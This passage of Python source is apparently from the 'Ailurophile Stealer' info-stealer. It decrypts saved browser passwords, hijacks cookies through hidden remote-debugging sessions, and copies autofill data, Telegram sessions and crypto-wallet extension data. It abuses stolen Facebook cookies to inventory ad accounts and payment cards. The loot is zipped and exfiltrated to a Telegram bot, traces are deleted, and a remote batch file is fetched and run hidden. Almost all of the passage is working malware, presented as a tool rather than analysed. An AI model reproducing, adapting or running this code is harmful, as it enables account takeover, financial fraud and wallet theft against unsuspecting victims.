            decrypted_password = decrypt_password(password_value, bytes.fromhex(decrypted_key)) if decrypted_key else None
            if not decrypted_password:
                continue
            date_created = datetime.datetime.fromtimestamp((date_created / 1000000) - 11644473600, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            passwords.append(f"================\nURL: {origin_url}\nUsername: {username_value}\nPassword: {decrypted_password}\nDate Created: {date_created}\nApplication: {browser_name} {profile_name}\n")
            total_passwords += 1
        conn.close()
        if passwords:
            passwords_folder = Path(WorkPath) / "Passwords"
            passwords_folder.mkdir(parents=True, exist_ok=True)
            passwords_file = passwords_folder / f"{browser_name} - {profile_name}.txt"
            with open(passwords_file, 'w', encoding='utf-8') as f:
                f.write("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n" + "".join(passwords))
    return total_passwords
def decrypt_password(encrypted_value, key):
    try:
        iv = encrypted_value[3:15]
        encrypted_data = encrypted_value[15:-16]
        auth_tag = encrypted_value[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(encrypted_data, auth_tag)
        return decrypted.decode()
    except Exception as e:
        return None
def get_cookie(chromium_paths, WorkPath):
    count = 0

    for browser_info in chromium_paths:
        profile_path = browser_info["profile_path"]
        profile_name = browser_info["profile_name"]
        root_path = browser_info["root_path"]

        # Kiểm tra đúng tên profile từ profile_path thay vì chỉ dựa vào profile_name
        actual_profile_name = profile_path.name  # Lấy tên thư mục profile thực tế

        while True:
            try:
                subprocess.run(["taskkill", "/F", "/IM", root_path.name], creationflags=0x08000000)
                proc = subprocess.Popen([
                    str(root_path),
                    '--remote-debugging-port=9876',
                    f'--profile-directory={actual_profile_name}',  # Sử dụng tên thư mục thực tế
                    '--remote-allow-origins=*',
                    '--window-position=10000,10000',
                    '--window-size=1,1',
                    '--disable-gpu',
                    '--no-sandbox'
                ], creationflags=0x08000000)
                ws_url = requests.get("http://localhost:9876/json").json()[0]['webSocketDebuggerUrl']
                ws = create_connection(ws_url)
                ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
                cookies = json.loads(ws.recv())['result']['cookies']
                ws.close()
                proc.kill()
                result = ""
                for c in cookies:
                    result += f"{c['domain']}\t{'TRUE' if c['domain'].startswith('.') else 'FALSE'}\t{c['path']}\t{'TRUE' if c['secure'] else 'FALSE'}\t{int(c.get('expires', 0))}\t{c['name']}\t{c['value']}\n"
                    count += 1
                if count > 0:
                    cookie_folder = Path(WorkPath) / "Cookies"
                    cookie_folder.mkdir(parents=True, exist_ok=True)
                    cookies_file = cookie_folder / f"{root_path.stem} - {actual_profile_name}.txt"
                    with open(cookies_file, "w", encoding="utf-8") as f:
                        f.writelines(result)
                break
            except Exception as e:
                print(f"Lỗi khi xử lý {actual_profile_name}: {e}")
                continue
    return count
def extract_facebook_cookies(work_path):
    cookies_dir = Path(work_path) / "Cookies"
    found_facebook_cookie = 0
    for cookie_file in cookies_dir.glob("*.txt"):
        with open(cookie_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        cookie_dict = {}
        for line in lines:
            parts = line.strip().split('\t')
            if len(parts) >= 7 and parts[0].endswith(".facebook.com"):
                name = parts[5]
                value = parts[6]
                cookie_dict[name] = value
        if "c_user" in cookie_dict:
            formatted_cookies = "; ".join([f"{key}={value}" for key, value in cookie_dict.items()])
            browser_profile = cookie_file.stem
            facebook_file_name = f"{browser_profile}_facebook.txt"
            facebook_file_path = Path(work_path) / facebook_file_name
            with open(facebook_file_path, 'w', encoding='utf-8') as f:
                f.write(formatted_cookies)
            found_facebook_cookie = 1
    return found_facebook_cookie
def get_existing_gecko_browsers():
    gecko_browsers = {
        "Firefox": f"{os.getenv('APPDATA')}\\Mozilla\\Firefox",
        "Pale Moon": f"{os.getenv('APPDATA')}\\Moonchild Productions\\Pale Moon",
        "SeaMonkey": f"{os.getenv('APPDATA')}\\Mozilla\\SeaMonkey",
        "Waterfox": f"{os.getenv('APPDATA')}\\Waterfox",
        "Mercury": f"{os.getenv('APPDATA')}\\mercury",
        "K-Meleon": f"{os.getenv('APPDATA')}\\K-Meleon",
        "IceDragon": f"{os.getenv('APPDATA')}\\Comodo\\IceDragon",
        "Cyberfox": f"{os.getenv('APPDATA')}\\8pecxstudios\\Cyberfox",
        "BlackHaw": f"{os.getenv('APPDATA')}\\NETGATE Technologies\\BlackHaw",
    }
    existing_browsers = {}
    for browser_name, basepath in gecko_browsers.items():
        profiles = get_profiles(basepath)
        if profiles:
            existing_browsers[browser_name] = profiles
    return existing_browsers
def get_profiles(basepath):
    try:
        profiles_path = os.path.join(basepath, "profiles.ini")
        with open(profiles_path, "r", encoding="utf-8") as f:
            data = f.read()
        profiles = [
            os.path.join(basepath, p.strip()[5:]) 
            for p in re.findall(r"^Path=.+(?s:.)$", data, re.M)
        ]
    except Exception:
        profiles = []
    return profiles
existing_gecko_browsers = get_existing_gecko_browsers()
def decrypt_aes(decoded_item, master_password, global_salt):
    entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
    iteration_count = int(decoded_item[0][0][1][0][1][1])
    encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
    key = pbkdf2_hmac('sha256', encoded_password, entry_salt, iteration_count, dklen=32)
    init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
    encrypted_value = decoded_item[0][1].asOctets()
    cipher = AES.new(key, AES.MODE_CBC, init_vector)
    return cipher.decrypt(encrypted_value)
def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    hp = sha1(globalSalt + masterPassword.encode()).digest()
    pes = entrySalt.ljust(20, b"\x00")
    chp = sha1(hp + entrySalt).digest()
    k1 = hmac_new(chp, pes + entrySalt, sha1).digest()
    k2 = hmac_new(chp, hmac_new(chp, pes, sha1).digest() + entrySalt, sha1).digest()
    key = k1 + k2
    iv, key = key[-8:], key[:24]
    return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)
def getKey(directory: Path, masterPassword=""):
    dbfile = directory / "key4.db"
    try:
        conn = sqlite3.connect(dbfile)
        c = conn.cursor()
    except sqlite3.Error as e:
        return None
    try:
        c.execute("SELECT item1, item2 FROM metadata;")
        globalSalt, item2 = next(c)
    except (sqlite3.OperationalError, StopIteration) as e:
        return None
    try:
        decodedItem2, _ = decode(item2)
        encryption_method = '3DES'
        entrySalt = decodedItem2[0][1][0].asOctets()
        cipherT = decodedItem2[1].asOctets()
    except AttributeError:
        encryption_method = 'AES'
        decodedItem2 = decode(item2)
    try:
        c.execute("SELECT a11, a102 FROM nssPrivate WHERE a102 = ?;", 
                  (b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01",))
        a11, a102 = next(c)
    except (sqlite3.OperationalError, StopIteration) as e:
        return None
    if encryption_method == 'AES':
        decodedA11 = decode(a11)
        key = decrypt_aes(decodedA11, masterPassword, globalSalt)
    elif encryption_method == '3DES':
        decodedA11, _ = decode(a11)
        oid = decodedA11[0][0].asTuple()
        assert oid == (1, 2, 840, 113_549, 1, 12, 5, 1, 3), f"Không nhận dạng được định dạng khóa {oid}"
        entrySalt = decodedA11[0][1][0].asOctets()
        cipherT = decodedA11[1].asOctets()
        key = decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)
    return key[:24]
final_gecko_browsers = {}
for browser, profiles in existing_gecko_browsers.items():
    final_profiles = []
    for profile in profiles:
        key = getKey(Path(profile))
        if key:
            final_profiles.append({"profile": profile, "key": key.hex()})
        else:
            pass
    if final_profiles:
        final_gecko_browsers[browser] = final_profiles
def PKCS7unpad(b):
    return b[: -b[-1]]
def decodeLoginData(key, data):
    asn1data, _ = decode(b64decode(data))
    assert asn1data[0].asOctets() == b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
    assert asn1data[1][0].asTuple() == (1, 2, 840, 113_549, 3, 7)
    iv = asn1data[1][1].asOctets()
    ciphertext = asn1data[2].asOctets()
    des = DES3.new(key, DES3.MODE_CBC, iv)
    return PKCS7unpad(des.decrypt(ciphertext)).decode()
def get_password_gecko(browser_data):
    count = 0
    for browser_name, profiles in browser_data.items():
        for profile_info in profiles:
            profile = profile_info["profile"]
            key = profile_info["key"]
            profile_name = os.path.basename(profile)
            try:
                with open(os.path.join(profile, "logins.json"), "r") as loginf:
                    jsonLogins = json.load(loginf)
                if "logins" not in jsonLogins:
                    continue
                logins = []
                for row in jsonLogins["logins"]:
                    encUsername = row["encryptedUsername"]
                    encPassword = row["encryptedPassword"]
                    hostname = row["hostname"]
                    decryptedUsername = decodeLoginData(bytes.fromhex(key), encUsername)
                    decryptedPassword = decodeLoginData(bytes.fromhex(key), encPassword)
                    logins.append((hostname, decryptedUsername, decryptedPassword))
                login_data = ""
                for login in logins:
                    login_data += f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {login[2]}\nApplication: {browser_name} [Profile: {profile_name}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    count += 1
                if count > 0:
                    passwords_folder = WorkPath / "Passwords"
                    passwords_folder.mkdir(parents=True, exist_ok=True)
                    logins_file = passwords_folder / f"{browser_name} - {profile_name}.txt"
                    with open(logins_file, "w", encoding="utf-8") as f:
                        f.write(login_data)
            except Exception as e:
                continue
    return count
def get_cookie_gecko(browser_data):
    count = 0
    for browser_name, profiles in browser_data.items():
        for profile_info in profiles:
            profile = profile_info["profile"]
            profile_name = os.path.basename(profile)
            cookies_db = os.path.join(profile, "cookies.sqlite")
            if not os.path.isfile(cookies_db):
                continue
            try:
                with sqlite3.connect(f"file:{cookies_db}?mode=ro", uri=True) as conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT host, path, name, value, isSecure, isHttpOnly, expiry FROM moz_cookies")
                    cookies = cursor.fetchall()
            except sqlite3.Error as e:
                continue

            cookies_data = []
            fb_result = []
            for cookie in cookies:
                host, path, name, value, is_secure, is_http_only, expiry = cookie
                secure_str = "TRUE" if is_secure else "FALSE"
                httponly_str = "TRUE" if is_http_only else "FALSE"
                cookies_data.append(f"{host}\t{secure_str}\t{path}\t{httponly_str}\t{expiry}\t{name}\t{value}\n")
                if host == ".facebook.com":
                    fb_result.append(f"{name}={value}")
                count += 1

            cookies_folder = WorkPath / "Cookies"
            cookies_folder.mkdir(parents=True, exist_ok=True)
            cookies_file = cookies_folder / f"{browser_name} - {profile_name}.txt"
            with open(cookies_file, "w", encoding="utf-8") as f:
                f.writelines(cookies_data)

    return count

class Facebook():
    def __init__(self, cookie):
        self.rq = requests.Session()
        cookies = self.Parse_Cookie(cookie)
        headers = {'authority': 'adsmanager.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','viewport-width': '794'}
        self.rq.headers.update(headers)
        self.rq.cookies.update(cookies)
        self.token = self.Get_Market()
        if self.token == False:
            return None
        else:
            self.uid = cookies['c_user']

    def Parse_Cookie(self, cookie):
        cookies = {}
        
        for c in cookie.split(';'):
            key_value = c.strip().split('=', 1)
            if len(key_value) == 2:
                key, value = key_value
                if key.lower() in ['c_user', 'xs', 'fr']: 
                    cookies[key] = value
        return cookies

    def Get_Market(self):
        try:
            act = self.rq.get('https://adsmanager.facebook.com/adsmanager/manage')
            list_data = act.text
            x = list_data.split("act=")
            idx = x[1].split('&')[0]
            list_token = self.rq.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=1&nav_source=no_referrer')
            list_token = list_token.text
            x_token = list_token.split('function(){window.__accessToken="')
            token = (x_token[1].split('";')[0])
            return token
        except:
            return False
   
    def Get_info_Tkqc(self):
        list_tikqc = self.rq.get(f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={self.token}")
        data = ""
        data += f"Tổng Số TKQC: {str(len(list_tikqc.json()['data']))}\n"
        for item in list_tikqc.json()['data']:
            xitem = item["id"]
            x = self.rq.get(f"https://graph.facebook.com/v16.0/{xitem}/?fields=spend_cap,balance,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time,all_payment_methods%7Bpm_credit_card%7Bdisplay_string%2Cis_verified%7D%7D&access_token={self.token}")
            try:
                statut = x.json()["account_status"]
            except:
                statut = "Không Rõ Trạng Thái"
            if int(statut) == 1:
                stt = "LIVE"
            else:
                stt = "DIE"
            try:
                credit_card_data = x.json()["all_payment_methods"]["pm_credit_card"]["data"]
                card_display_string = credit_card_data[0]["display_string"]
                if credit_card_data[0]["is_verified"]:
                    verify_cc = "Đã Xác Minh"
                else:
                    verify_cc = "No_Verified"
                thanh_toan = f"{card_display_string} - {verify_cc}"
            except:
                thanh_toan = "Không Thẻ"

            name = x.json()["name"]
            id_tkqc = x.json()["id"]
            tien_te = x.json()["currency"]
            so_du = x.json()["balance"]
            du_no = x.json()["spend_cap"]
            da_chi_tieu = x.json()["amount_spent"]
            if x.json()["adtrust_dsl"] == -1:
                limit_ngay = "No Limit"
            else:
                limit_ngay = x.json()["adtrust_dsl"]
            created_time = x.json()["created_time"]
            try:
                nguong_no = "{:.2f}".format(float(x.json()["adspaymentcycle"]["data"][0]["threshold_amount"]) / 100)
            except:
                nguong_no = "0"
            data += f"- Tên TKQC: {name}|ID_TKQC: {id_tkqc}|Trạng Thái: {stt}|Tiền Tệ: {tien_te}|Số Dư: {so_du} {tien_te}|Đã Tiêu Vào Ngưỡng: {du_no} {tien_te}|Tổng Đã Chi Tiêu: {da_chi_tieu} {tien_te}|Limit Ngày: {limit_ngay} {tien_te}|Ngưỡng: {nguong_no} {tien_te}|Thanh Toán: {thanh_toan}|Ngày Tạo: {created_time[:10]}\n"
        return data
    
    def Get_Page(self):
        data = self.rq.get(f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={self.token}")    
        if 'data' in data.json():
            pages = data.json()["data"]
            data = f"Tổng Số Page: {str(len(pages))}\n"
            for page in pages:
                name = page["name"]
                link = page["link"]
                like = page["fan_count"]
                fl = page["followers_count"]
                veri = page["verification_status"]
                data += f"- {name}|{link}|{like}|{fl}|{veri}\n"
            return data
        else:
            return "==> Không có Page\n"

    def Get_QTV_GR(self):
        list_group = self.rq.get(f"https://graph.facebook.com/v17.0/me/groups?fields=administrator&access_token={self.token}").text
        data = json.loads(list_group)
        ids = ""

        for item in data["data"]:
            if item["administrator"]:
                if not ids:
                    ids = "Các Group Cầm QTV:\n"
                id = item["id"]
                ids += f"- https://www.facebook.com/groups/{id}\n"
        if not ids:
            ids = "===> Không Có Group Cầm QTV"
        return ids
    
    def Get_id_BM(self):
        data = self.rq.get(f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={self.token}")
        try:
            listbm = data.json()["businesses"]["data"]
            id_list = []
            for item  in listbm:
                business_id = item["id"]
                id_list.append(business_id)
            return id_list
        except:
            return None

    def Get_Tk_In_BM(self):
        listbm = self.Get_id_BM()
        if listbm is not None:
            result = "Thông Tin BM:\n" 
            for idbm in listbm:
                rq = self.rq.get(f"https://graph.facebook.com/v17.0/{idbm}?fields=owned_ad_accounts%7Baccount_status,balance,currency,business_country_code,amount_spent,spend_cap,created_time,adtrust_dsl%7D,client_ad_accounts%7Baccount_status,balance,currency,business_country_code,amount_spent,spend_cap,created_time,adtrust_dsl%7D&access_token={self.token}")
                try:
                    list_tkqc = rq.json()["owned_ad_accounts"]["data"]
                except:
                    result += f"- ID_BM: {idbm} --> BM Trắng\n"
                    continue

                for item in list_tkqc:
                    stt = item["account_status"]
                    if int(stt) == 1:
                        stt = "LIVE"
                    else:
                        stt = "DIE"
                    tien_te = item["currency"]
                    try:
                        country = item["business_country_code"]
                    except:
                        country = "Check Miss"
                    so_du = item["balance"]
                    da_chi_tieu = item["amount_spent"]
                    nguong_no = item["spend_cap"]
                    ngaytao = item["created_time"]
                    if item["adtrust_dsl"] == -1:
                        limit_ngay = "No Limit"
                    else:
                        limit_ngay = item["adtrust_dsl"]
                    id_tkqc = item["id"]
                    result += f"- ID_BM: {idbm}({self.Check_Slot_BM(idbm)})|ID_TKQC: {id_tkqc}|Trạng Thái: {stt}|Quốc Gia: {country}|Tiền Tệ: {tien_te}|Số Dư: {so_du} {tien_te}|Tổng Đã Chi Tiêu: {da_chi_tieu} {tien_te}|Limit Ngày: {limit_ngay} {tien_te}|Ngưỡng: {str(nguong_no)} {tien_te}|Ngày Tạo: {ngaytao[:10]}\n"
            return result
        else:
            return "==> Không có BM\n"
            
    def Get_DTSG(self):
        rq = self.rq.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
        data = rq.content.decode('utf-8')
        fb_dtsg = data.split('name=\\"fb_dtsg\\" value=\\"')[1].split('\\')[0]
        hsi = data.split('\\"hsi\\":\\"')[1].split('\\",')[0]
        spin_t = data.split('\\"__spin_t\\":')[1].split(',')[0]
        spin_r = data.split('__spin_r\\":')[1].split(',')[0]
        jazoest = data.split('name=\\"jazoest\\" value=\\"')[1].split('\\"')[0]
        return fb_dtsg, hsi, spin_t, spin_r, jazoest
    
    def Check_Slot_BM(self,idbm):
        fb_dtsg, hsi, spin_t, spin_r, jazoest = self.Get_DTSG()
        params = {'business_id': idbm}
        data = {'__user': self.uid ,'__a': '1','__req': '6','__hs': '19577.BP:brands_pkg.2.0..0.0','dpr': '1','__ccg': 'EXCELLENT','__rev': spin_r,'__s': 'vio2ve:9w2u8u:bushdg','__hsi': hsi,'__dyn': '7xeUmxa2C5rgydwn8K2abBWqxu59o9E4a2i5VEdpE6C4UKegdp98Sm4Euxa1twKzobo9E7C1FxG9xedz8hwgo5S3a4EuCwQwCxq1zwCCwjFEK3idwOQ17m3Sbwgo7y78abwEwk89oeUa8fGxnzoO1WwamcwgECu7E422a3Fe6rwnVUao9k2C4oW18wRwEwiUmwnHxJxK48GU8EhAy88rwzzXx-ewjovCxeq4o884O1fwQzUS2W2K4E5yeDyU52dCgqw-z8c8-5aDBwEBwKG13y85i4oKqbDyo-2-qaUK2e0UFU2RwrU6CiU9E4KeCK2q1pwjouwg8a85Ou','__csr': '','fb_dtsg': fb_dtsg,'jazoest': jazoest,'lsd': 'rLFRv1HDaMzv8jQKSvvUya','__bid': idbm,'__spin_r': spin_r,'__spin_b': 'trunk','__spin_t': spin_t,'__jssesw': '1',}
        check = self.rq.post('https://business.facebook.com/business/adaccount/limits/',params=params,data=data)     
        data = check.text.split(');', 1)[1]
        json_data = json.loads(data)
        ad_account_limit = json_data['payload']['adAccountLimit']
        return ad_account_limit

    def ADS_Checker(self):
        try:
            result = f"{self.Get_info_Tkqc()}\n{self.Get_Tk_In_BM()}\n{self.Get_Page()}\n{self.Get_QTV_GR()}"
            return result
        except Exception:
            return ""
            
def get_autofill(chromium_paths, main_folder_path):
    user_copyright = "Ailurophile Stealer - Telegram: @Ailurophilevn\n\n"
    autofill_data = []

    def copy_file(src, dst):
        try:
            shutil.copy2(src, dst)
            return True
        except Exception as e:
            print(f"Error copying file from {src} to {dst}: {e}")
            return False

    for browser_info in chromium_paths:
        profile_path = browser_info["profile_path"]
        profile_name = browser_info["profile_name"]
        root_path = browser_info["root_path"]

        application_name = root_path.stem.replace(".exe", "").replace("_", " ").title()
        web_data_path = profile_path / "Web Data"
        web_data_db_path = profile_path / "webdata.db"

        if not web_data_path.exists():
            continue

        if not copy_file(web_data_path, web_data_db_path):
            continue

        try:
            conn = sqlite3.connect(web_data_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM autofill")
            rows = cursor.fetchall()
        except Exception as e:
            print(f"Error reading from database {web_data_db_path}: {e}")
            continue
        finally:
            conn.close()
        for row in rows:
            name, value = row[1], row[2]  # Giả sử 'name' và 'value' nằm ở các vị trí này trong cơ sở dữ liệu
            autofill_data.append(f"================\nName: {name}\nValue: {value}\nApplication: {application_name} {profile_name}\n")
        if not autofill_data:
            autofill_data.append(f"No autofills found for {application_name} {profile_name}\n")
    if autofill_data:
        autofills_folder_path = Path(main_folder_path) / "Autofills"
        autofills_folder_path.mkdir(parents=True, exist_ok=True)
        autofills_file_path = autofills_folder_path / "Autofills.txt"

        if autofills_file_path.exists():
            autofills_file_path.unlink()

        with open(autofills_file_path, 'w', encoding='utf-8') as f:
            f.write(user_copyright + "".join(autofill_data))

    return len(autofill_data)
def get_history(chromium_paths, main_folder_path):
    total_history_entries = 0
    def copy_file(src, dst):
        try:
            shutil.copy2(src, dst)
            return True
        except Exception as e:
            print(f"Error copying file from {src} to {dst}: {e}")
            return False
    for browser_info in chromium_paths:
        history_entries = []
        profile_path = browser_info["profile_path"]
        profile_name = browser_info["profile_name"]
        root_path = browser_info["root_path"]
        app_name = root_path.stem.replace(".exe", "").replace("_", " ").title()
        history_data_path = profile_path / "History"
        history_db_path = profile_path / "history.db"

        if not history_data_path.exists():
            continue

        if not copy_file(history_data_path, history_db_path):
            continue

        try:
            conn = sqlite3.connect(history_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            rows = cursor.fetchall()
        except Exception as e:
            print(f"Error reading from database {history_db_path}: {e}")
            continue
        finally:
            conn.close()

        for row in rows:
            url, title, visit_count, last_visit_time = row
            if not url:
                continue

            date_visited = datetime.datetime.fromtimestamp((last_visit_time / 1000000) - 11644473600, datetime.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            history_entries.append(f"================\nURL: {url}\nTitle: {title}\nVisit Count: {visit_count}\nLast Visit Time: {date_visited}\nApplication: {app_name} {profile_name}\n")
            total_history_entries += 1

        if not history_entries:
            history_entries.append("No history found")

        history_folder_path = Path(main_folder_path) / "History"
        history_folder_path.mkdir(parents=True, exist_ok=True)

        history_file = history_folder_path / f"{app_name} - {profile_name}.txt"
        with open(history_file, 'w', encoding='utf-8') as f:
            f.write("Ailurophile Stealer - Telegram: @Ailurophilevn\n\n" + "".join(history_entries))

    return total_history_entries
def check_facebook_files(WorkPath):
    facebook_files = list(Path(WorkPath).glob('*facebook.txt'))
    if not facebook_files:
        return "No facebook account. Check other"
    result_summary = "Have facebook account with out ADS balance"
    checknum = 0
    for facebook_file in facebook_files:
        try:
            with open(facebook_file, 'r', encoding='utf-8') as f:
                cookie = f.read().strip()
                fb = Facebook(cookie)
                tokenfb = fb.Get_Market()
                if tokenfb:
                    result = fb.ADS_Checker()
                    checknum = checknum + 1
                    with open(facebook_file, 'a', encoding='utf-8') as f_append:
                        f_append.write(f"\n\nKết quả ADS Checker:\n{result}")
                else:
                    pass
                    with open(facebook_file, 'a', encoding='utf-8') as f_append:
                        f_append.write("\nKhông kiểm tra được tài khoản ADS")
        except Exception as e:
            continue
            
            
    if checknum > 0: 
        result_summary = "Have FB ADS account for get money"
    return result_summary if result_summary else "Can not check ADS"
def zip_workpath(WorkPath, NameFile):
    if ':' in NameFile:
        NameFile = NameFile.replace(':', '_')
    NameFileZip = NameFile + ".zip"
    zip_file = Path(os.getenv("LOCALAPPDATA")) / NameFileZip
    try:
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(WorkPath):
                for file in files:
                    full_path = os.path.join(root, file)
                    relative_path = os.path.relpath(full_path, WorkPath)
                    zipf.write(full_path, relative_path)
        return zip_file
    except Exception as e:
        return None
def send_telegram_document(TOKEN_BOT, CHAT_ID, archive_path, message_body, max_retries=10):
    for i in range(max_retries):
        try:
            with open(archive_path, "rb") as f:
                response = requests.post(
                    f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
                    params={
                        "chat_id": CHAT_ID,
                        "caption": message_body,
                        "protect_content": True,
                        "disable_web_page_preview": True
                    },
                    files={"document": f}
                )
                response.raise_for_status()
                break
        except Exception as e:
            continue 
def delete_folder_and_file(WorkPath, file_send):
    workpath_dir = Path(WorkPath)
    if workpath_dir.exists() and workpath_dir.is_dir():
        try:
            shutil.rmtree(workpath_dir)
            pass
        except Exception as e:
            pass
    file_send_path = Path(file_send)
    if file_send_path.exists() and file_send_path.is_file():
        try:
            os.remove(file_send_path)
            pass
        except Exception as e:
            pass
def download_and_save_exact_content(url, save_dir):
    temp_filename = next(tempfile._get_candidate_names()) + ".bat"
    save_path = os.path.join(save_dir, temp_filename)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req) as response:
            raw_content = response.read()
            try:
                content = raw_content.decode('utf-8')
            except UnicodeDecodeError:
                content = raw_content.decode('ISO-8859-1')
            with open(save_path, 'w', newline='', encoding='utf-8') as f:
                f.write(content)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.run([save_path], startupinfo=startupinfo)
    except Exception as e:
        pass     
def submit_telegram(main_path):
    try:
        source_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
        if not (os.path.isdir(source_path) or os.path.isfile(source_path)):
            return 0
        destination_path = os.path.join(main_path, "Telegram")
        if not os.path.exists(destination_path):
            try:
                os.makedirs(destination_path, mode=0o777)
            except Exception:
                return 0
        subprocess.run("taskkill /IM Telegram.exe /F", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        blacklist_folders = ["emoji", "user_data", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
        copied = False
        for file in os.listdir(source_path):
            if file in ('.', '..') or file in blacklist_folders:
                continue
            source_item_path = os.path.join(source_path, file)
            target_item_path = os.path.join(destination_path, file)
            try:
                if os.path.isdir(source_item_path):
                    os.makedirs(target_item_path, exist_ok=True)
                    shutil.copytree(source_item_path, target_item_path, dirs_exist_ok=True)
                else:
                    shutil.copy2(source_item_path, target_item_path)
                copied = True
            except Exception:
                pass
        return 1 if copied else 0
    except Exception:
        return 0   
pass_chrome = get_passwords(existing_chromium_paths, WorkPath)
cookie_chrome = get_cookie(existing_chromium_paths, WorkPath)
#history_chrome = get_history(existing_chromium_paths, WorkPath)
autofill_chrome = get_autofill(existing_chromium_paths, WorkPath)
pass_gecko = get_password_gecko(final_gecko_browsers)
cookie_gecko = get_cookie_gecko(final_gecko_browsers)
check_fb = extract_facebook_cookies(WorkPath)
message_fb = check_facebook_files(WorkPath)
telegram = submit_telegram(WorkPath)
message = (
    f"{message_fb}\n"
    f"Chrome Passwords: {pass_chrome}\n"
    f"Chrome Cookies: {cookie_chrome}\n"
    #f"Chrome History Entries: {history_chrome}\n"
    f"Chrome Autofill Entries: {autofill_chrome}\n"
    f"Gecko Passwords: {pass_gecko}\n"
    f"Gecko Cookies: {cookie_gecko}\n"
    f"Facebook Check: {check_fb}\n"
    f"Telegram Check: {telegram}\n"
)

def copy_folder(src, dst):
    try:
        if os.path.exists(dst):
            shutil.rmtree(dst)
        shutil.copytree(src, dst)
    except Exception as e:
        return False
    return True

def local_wallet_data(work_path, wallets):
    wallets_destination = os.path.join(work_path, "Wallets")
    os.makedirs(wallets_destination, exist_ok=True)
    for wallet_name, wallet_source_path in wallets.items():
        if not os.path.exists(wallet_source_path):
            continue
        wallet_destination = os.path.join(wallets_destination, wallet_name)
        if not copy_folder(wallet_source_path, wallet_destination):
            print(f"Không thể sao chép {wallet_name}, bỏ qua...")
            continue
    return 1
    
wallet_paths = {
    "Metamask": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"),
    "Coinbase": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"),
    "Cara": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mdjmfdffdcmnoblignmgpommbefadffd"),
    "BinanceChain": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"),
    "Phantom": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    "TronLink": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"),
